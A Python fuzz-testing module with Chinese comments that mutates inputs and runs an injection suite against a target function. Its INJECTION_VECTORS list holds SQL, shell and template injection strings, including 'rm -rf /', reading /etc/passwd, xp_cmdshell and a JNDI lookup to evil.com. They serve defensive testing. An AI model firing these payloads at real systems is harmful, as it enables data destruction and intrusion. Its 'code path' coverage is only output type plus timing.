"""FuzzTester — 模糊测试安全验证.

基于:
- "Fuzz Testing for AI Systems" (Godefroid et al., 2005)
  - 输入变异: 随机扰动输入测试鲁棒性
  - 边界测试: 极限值/空值/特殊字符
  - 注入测试: SQL/命令/模板注入
  - 覆盖率追踪: 检测触发新代码路径

算法:
    fuzz_test(func, inputs, iterations):
        1. 对每个输入执行变异
        2. 执行测试函数
        3. 捕获异常和边界情况
        4. 统计覆盖率

复杂度:
    fuzz_test(): O(I × M) 其中I=迭代数,M=变异数
"""
from __future__ import annotations
import random
import logging

logger = logging.getLogger(__name__)

import time
import string
from typing import Callable, Optional, Any


# 变异策略
MUTATION_STRATEGIES = {
    "random_insert": "随机插入字符",
    "random_delete": "随机删除字符",
    "boundary_extreme": "边界值测试",
    "injection_sql": "SQL注入测试",
    "injection_cmd": "命令注入测试",
    "unicode_edge": "Unicode边界测试",
    "null_bytes": "空字节注入",
    "oversized": "超大输入测试",
}


# 注入测试向量
INJECTION_VECTORS = {
    "sql": [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM information_schema.tables --",
        "1; EXEC xp_cmdshell('whoami')",
    ],
    "cmd": [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "; rm -rf /",
    ],
    "template": [
        "{{7*7}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}",
        "${jndi:ldap://evil.com/a}",
    ],
}


class FuzzTester:
    """模糊测试器 — AI系统安全验证.
    
    通过输入变异和注入测试检测系统脆弱性.
    """
    
    def __init__(self, max_iterations: int = 100, max_input_size: int = 10000,
                 seed: Optional[int] = None):
        """初始化.
        
        Args:
            max_iterations: 最大迭代次数
            max_input_size: 最大输入大小
            seed: 随机种子
        """
        self._max_iterations = max_iterations
        self._max_input_size = max_input_size
        self._rng = random.Random(seed)
        
        self._test_results: list[dict] = []
        self._crashes: list[dict] = []
        self._total_tests = 0
        self._code_paths: set[str] = set()
    
    def fuzz_test(self, target_fn: Callable, seed_inputs: list[Any],
                  iterations: int | None = None) -> list[dict]:
        """执行模糊测试.
        
        Args:
            target_fn: 目标函数
            seed_inputs: 种子输入列表
            iterations: 迭代次数
        
        Returns:
            list: 测试结果
        """
        n = iterations or self._max_iterations
        results = []
        
        for i in range(n):
            # 选择种子输入
            seed = self._rng.choice(seed_inputs) if seed_inputs else ""
            
            # 执行变异
            mutated = self._mutate_input(str(seed))
            
            # 执行测试
            result = self._run_test(target_fn, mutated, i)
            results.append(result)
            self._total_tests += 1
        
        if results:
            self._test_results.extend(results)
            if len(self._test_results) > 1000:
                self._test_results = self._test_results[-500:]
        
        return results
    
    def _mutate_input(self, original: str) -> str:
        """变异输入.
        
        Args:
            original: 原始输入
        
        Returns:
            str: 变异后的输入
        """
        strategy = self._rng.choice(list(MUTATION_STRATEGIES.keys()))
        
        if strategy == "random_insert":
            # 随机插入字符
            if not original:
                return self._rng.choice(string.ascii_letters)
            pos = self._rng.randint(0, len(original))
            char = self._rng.choice(string.ascii_letters + string.digits + " !@#$%")
            return original[:pos] + char + original[pos:]
        
        elif strategy == "random_delete":
            # 随机删除字符
            if len(original) <= 1:
                return ""
            pos = self._rng.randint(0, len(original) - 1)
            return original[:pos] + original[pos + 1:]
        
        elif strategy == "boundary_extreme":
            # 边界值
            boundaries = ["", " ", "\n", "\t", "\0", " " * 100, "a" * 1000]
            return self._rng.choice(boundaries)
        
        elif strategy == "injection_sql":
            return self._rng.choice(INJECTION_VECTORS["sql"])
        
        elif strategy == "injection_cmd":
            return self._rng.choice(INJECTION_VECTORS["cmd"])
        
        elif strategy == "unicode_edge":
            # Unicode边界字符
            unicode_chars = ["\uffff", "\U0010ffff", "\ud800", "\udcff", "\u200b", "\ufeff"]
            prefix = self._rng.choice(unicode_chars)
            return prefix + original
        
        elif strategy == "null_bytes":
            pos = self._rng.randint(0, max(len(original), 1))
            return original[:pos] + "\x00" + original[pos:]
        
        elif strategy == "oversized":
            return original * self._rng.randint(10, 100)
        
        return original
    
    def _run_test(self, target_fn: Callable, input_val: str, iteration: int) -> dict:
        """运行单个测试.
        
        Args:
            target_fn: 目标函数
            input_val: 输入值
            iteration: 迭代编号
        
        Returns:
            dict: 测试结果
        """
        start = time.time()
        result = {
            "iteration": iteration,
            "input_length": len(input_val),
            "input_preview": input_val[:50],
            "success": False,
            "error": None,
            "duration": 0,
            "triggered_path": "",
            "ts": time.time(),
        }
        
        try:
            output = target_fn(input_val)
            duration = time.time() - start
            result["success"] = True
            result["duration"] = duration
            result["output_type"] = type(output).__name__
            
            # 记录代码路径
            path_key = f"{type(output).__name__}:{duration:.3f}"
            self._code_paths.add(path_key)
            result["triggered_path"] = path_key
            
        except Exception as e:
            duration = time.time() - start
            result["error"] = str(e)[:200]
            result["error_type"] = type(e).__name__
            result["duration"] = duration
            
            # 记录崩溃
            self._crashes.append({
                "iteration": iteration,
                "error": str(e)[:200],
                "error_type": type(e).__name__,
                "input_preview": input_val[:50],
                "ts": time.time(),
            })
        
        return result
    
    def run_injection_suite(self, target_fn: Callable) -> list[dict]:
        """运行注入测试套件.
        
        Args:
            target_fn: 目标函数
        
        Returns:
            list: 测试结果
        """
        results = []
        all_vectors = INJECTION_VECTORS["sql"] + INJECTION_VECTORS["cmd"] + INJECTION_VECTORS["template"]
        
        for vector in all_vectors:
            result = self._run_test(target_fn, vector, len(results))
            result["injection_vector"] = vector
            results.append(result)
            self._total_tests += 1
        
        return results
    
    def get_stats(self) -> dict:
        """获取统计."""
        crashes_by_type = {}
        for c in self._crashes:
            t = c.get("error_type", "unknown")
            crashes_by_type[t] = crashes_by_type.get(t, 0) + 1
        
        success_count = sum(1 for r in self._test_results if r.get("success"))
        
        return {
            "total_tests": self._total_tests,
            "success_count": success_count,
            "crash_count": len(self._crashes),
            "crash_rate": round(len(self._crashes) / max(self._total_tests, 1), 4),
            "unique_code_paths": len(self._code_paths),
            "crashes_by_type": crashes_by_type,
        }
